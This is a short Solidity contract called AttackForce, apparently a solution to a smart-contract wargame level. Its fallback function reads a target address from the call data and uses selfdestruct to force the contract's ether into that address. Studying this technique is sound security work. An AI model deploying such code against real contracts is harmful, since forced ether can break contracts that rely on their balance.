// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackForce{

    address public forceAddress;

    fallback () external payable {
        forceAddress = abi.decode(msg.data, (address));
        selfdestruct(payable(forceAddress));
    }
}